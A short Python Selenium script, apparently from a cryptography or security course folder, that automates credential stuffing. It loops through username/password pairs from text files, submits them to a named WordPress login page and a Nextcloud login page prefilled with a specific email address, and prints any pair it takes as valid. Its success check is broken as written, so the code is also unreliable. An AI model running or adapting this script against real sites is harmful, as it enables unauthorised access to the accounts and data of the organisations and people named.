from selenium import webdriver
from selenium.webdriver.common.by import By
from time import sleep

credenciales = []
df = open('cripto/credenciales.txt')
lines = df.readlines()
for line in lines:
    credenciales.append(line.split())

driver = webdriver.Chrome("cripto/chromedriver")

driver.get("https://www.mch.cl/wp-login.php")
sleep(2)
for i in range(0, len(credenciales)):
    driver.find_element(By.ID, 'user_login').clear()
    driver.find_element(By.ID, 'user_pass').clear()
    driver.find_element(By.ID, 'user_login').send_keys(credenciales[i][0])
    sleep(2)
    driver.find_element(By.ID, 'user_pass').send_keys(credenciales[i][1])
    sleep(2)
    driver.find_element(By.XPATH, '/html/body/div[1]/form/p[4]/input[1]').click()
    if(not driver.find_element(By.XPATH, '/html/body/div[1]/form/p[4]/input[1]')):
        print('La credencial valida es: \n ususario: ',credenciales[i][0],' \n contraseña: ',credenciales[i][1])


credenciales2 = []
df = open('cripto/credenciales2.txt')
lines = df.readlines()
for line in lines:
    credenciales2.append(line.split())


driver.get("http://www.rhssystem.cl/nextcloud/nextcloud/index.php/login?user=acomerpuq@rhssystem.cl")
sleep(2)
for i in range(0, len(credenciales2)):
    driver.find_element(By.ID, 'user').clear()
    driver.find_element(By.ID, 'password').clear()
    driver.find_element(By.ID, 'user').send_keys(credenciales2[i][0])
    sleep(2)
    driver.find_element(By.ID, 'password').send_keys(credenciales2[i][1])
    sleep(2)
    driver.find_element(By.XPATH, '//*[@id="submit-form"]').click()
    sleep(2)
    if(not driver.find_element(By.XPATH, '//*[@id="submit-form"]')):
        print('La credencial valida es: \n ususario: ',credenciales2[i][0],' \n contraseña: ',credenciales2[i][1])
